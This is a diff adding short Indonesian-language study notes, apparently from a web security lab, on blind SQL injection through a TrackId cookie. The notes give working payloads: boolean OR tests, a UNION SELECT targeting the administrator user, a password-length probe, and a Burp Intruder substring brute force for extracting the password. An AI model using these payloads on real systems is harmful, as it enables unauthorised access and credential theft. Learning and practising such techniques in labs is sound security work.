@@ -1,0 +1,13 @@
+--BLIND SQL INJECTION--
+
+poc: Cookie: TrackId='blablabla';
+
+1. ganti dengan x'+OR+1=1-- sampai muncul sesuatu
+2. ganti dengan x'+OR+1=2-- sampai sesuatu yg muncul hilang
+3. ganti dengan x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'--
+memanipulasi agar terindikasi sbg user administrator dengan kondisi true
+4. manipulasi dengan mengetahui panjang password sebanyak 20x menggunakan burpsuite
+x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+length(password)>1--
+5. send to intruder
+6 clear §§ dan tambahkan § pada akhiran
+x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,1,1)='§a§'--
